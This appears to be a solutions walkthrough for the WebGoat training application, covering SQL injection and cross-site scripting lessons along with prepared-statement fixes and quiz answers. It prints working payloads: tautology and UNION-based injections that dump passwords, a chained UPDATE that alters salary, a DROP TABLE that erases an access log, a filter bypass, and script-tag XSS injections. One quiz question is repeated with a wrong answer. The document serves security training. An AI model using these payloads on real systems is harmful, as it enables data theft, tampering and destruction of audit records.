# SQL Injection (intro)

## What is SQL?

_Challenge_: retrieve the `department` of the employee **Bob Franco**.

_Solution_: `SELECT department FROM employees WHERE userid=96134`.

## Data Manipulation Language (DML)

_Challenge_: change the `department` of **Tobi Barnett** to `'Sales'`.

_Solution_: `UPDATE employees SET department='Sales' WHERE userid=89762`.

## Data Definition Language (DDL)

_Challenge_: modify the schema by adding the column `phone` _(varchar(20))_ to the table `employees`.

_Solution_: `ALTER TABLE employees ADD phone varchar(20)`.

## Data Control Language (DCL)

_Challenge_: grant rights to the table `grant_rights` to user `unauthorized_user`.

_Solution_: `GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user`.

## String SQL injection

_Challenge_: retrieve all the users from the users table using the query `"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";`.

_Solution_: **SELECT * FROM user_data WHERE first_name='John' AND last_name='** `Smith'` `or` `'1'='1` **'**

## Numeric SQL injection

_Challenge_: retrieve all the data from the users table using the form with query `"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;`.

_Solution_:
- Login_Count: `1`.
- User_Id: `2 OR 1=1;--`.

## Compromising confidentiality with String SQL injection

_Challenge_: retrieve all employee data from the **employees** table using the form with query `"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";`.

_Solution_:
- Employee Name: `Smith' OR 1=1;--`.
- Authentication TAN: `anything`.

## Compromising Integrity with Query chaining

_Challenge_: change your own salary so you are earning the most. Your name is John **Smith** and your current TAN is **3SL99A**.

_Solution_:
- Employee Name: `'; UPDATE employees SET SALARY=700000 WHERE AUTH_TAN='3SL99A';--`.
- Authentication TAN: `anything`.

## Compromising Availability

_Challenge_: delete the **access_log** table, where all your actions have been logged to.

_Solution_: `'; DROP TABLE access_log; --`.

# SQL Injection (advanced)

## Pulling data from other tables

_Challenge_: retrieve all data from the tables below to find Dave's password.

```
CREATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);
                        
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

_Solution_:
- Name: `anything'; SELECT * FROM user_system_data;--`.
- Password: `passW0rD`.
- Alternative for Name: `' UNION SELECT userid,user_name, password, 'a', 'b', 'c', 1 from user_system_data --`.

## Assignment

_Challenge_: can you log in as **Tom**?

_Solution_: ***TBC***

## Quiz

_What is the difference between a prepared statement and a statement?_
Solution 4: A statement includes actual values, whereas a prepared statement uses placeholders.

_Which one of the following characters is a placeholder for variables?_
Solution 3: ?

_How can prepared statements be faster than statements?_
Solution 2: Prepared statements are compiled once by the database management system and then reused with different inputs, reducing compilation overhead.

_How do prepared statements help prevent SQL injection?_
Solution 2: Prepared statements are compiled once by the database management system and then reused with different inputs, reducing compilation overhead.

_How do prepared statements help prevent SQL injection?_
Solution 3: Placeholders prevent user input from being directly appended to the SQL query, ensuring a clear separation between code and data.

_What happens if a person with malicious intent enters the following input into a registration form that uses a prepared statement? Input: Robert); DROP TABLE Students;--_
Solution 4: The database treats the entire input as a plain string: Robert); DROP TABLE Students;-- without executing it as SQL.

# SQL Injection (mitigation)

## Writing safe code

_Challenge_: complete the code, so that it’s no longer vulnerable to a SQL injection.

_Solution_:

``` java
Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
PreparedStatement statement = conn.prepareStatement("SELECT status FROM users WHERE name=? AND mail=?");
statement.setString(1, "Tom");
statement.setString(2, "Tom@Webgoat.org");
```

_Challenge_: write your own code to connect to a database and request data from it.

_Solution_:

``` java
try {
    String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";
    Connection connection = DriverManager.getConnection(DBURL, DBUSER, DBPW);
    PreparedStatement statement = connection.prepareStatement(query);
    statement.setString(1, "96453");
    ResultSet results = statement.executeQuery();
} catch (Exception e) {
    System.out.println("Oops. Something went wrong!");
}
```

## Input validation alone is not enough

_Challenge_: the developer fixed the possible SQL injection with filtering, spot the weakness in this approach.

_Solution_: `anything';/**/SELECT/**/*/**/FROM/**/user_system_data;--`.

## Assignment

_Challenge_: perform a SQL injection through the ORDER BY field and find the ip address of the `webgoat-prd` server (as in `xxx.130.219.202`).

_Solution_: ***TBC***

# Cross Site Scripting

## ## Reflected XSS

_Challenge_: identify which field is susceptible to XSS.

_Solution_:
- Enter your credit card number: `<script>alert();</script>`.
- Enter your three digit access code: `123`.

## Identify potential for DOM-Based XSS

_Challenge_: what is the route for the test code that stayed in the app during production.

_Solution_: look at `view/GoatRouter.js` and find the test route `start.mvc#test/`.

## DOM-Based XSS

_Challenge_: use the route you just found and see if you can use it to reflect a parameter from the route without encoding to execute an internal function in WebGoat. The function you want to execute is: **webgoat.customjs.phoneHome()**.

_Solution_: handler for test route is within `controller/LessonController.js` which calls `lessonContentView.showTestParam(param)`. Code for this function is `this.$el.find('.lesson-content').html('test:' + param);`.
Url to use is `http://localhost:8080/WebGoat/start.mvc?username=username#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E` which gives the random number `377753124` in the console.

## Quiz

_Is a well known website, like Netflix, immune to XSS attacks?_
Solution 4: No, because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.

_When do XSS attacks occur?_
Solution 3: When a website fails to validate or sanitize user input, allowing malicious scripts to be executed in a user's browser.

_What are Stored XSS attacks?_
Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.

_What are Reflected XSS attacks?_
Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the response.

_Is JavaScript the only way to perform XSS attacks?_
Solution 4: No, there are many other ways. Like HTML, Flash or any other type of code that the browser executes.

# Cross Site Scripting (stored)

_Challenge_: add a comment with a JavaScript payload(`webgoat.customjs.phoneHome`).

_Solution_: `<script>webgoat.customjs.phoneHome()</script>`. Random number is `912173590`.
